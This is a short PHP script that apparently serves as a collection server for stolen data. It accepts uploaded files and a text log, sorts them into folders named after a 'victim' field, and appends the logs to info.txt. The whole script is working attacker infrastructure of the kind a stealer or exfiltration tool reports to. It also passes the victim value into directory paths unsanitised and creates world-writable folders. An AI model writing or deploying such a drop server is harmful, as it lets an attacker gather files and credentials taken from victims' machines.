<?php
$uploadDir = "uploads/";
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0777, true);
}

$victim = $_POST['victim'] ?? 'unknown_' . time();
$victimDir = $uploadDir . $victim . "/";
if (!is_dir($victimDir)) mkdir($victimDir, 0777, true);

if ($_FILES) {
    foreach ($_FILES as $key => $file) {
        $target = $victimDir . basename($file["name"]);
        if (move_uploaded_file($file["tmp_name"], $target)) {
            echo "OK: " . $file["name"] . "\n";
        }
    }
}

if ($_POST['log']) {
    file_put_contents($victimDir . "info.txt", $_POST['log'], FILE_APPEND);
    echo "Log received";
}

echo "Upload complete";
?>
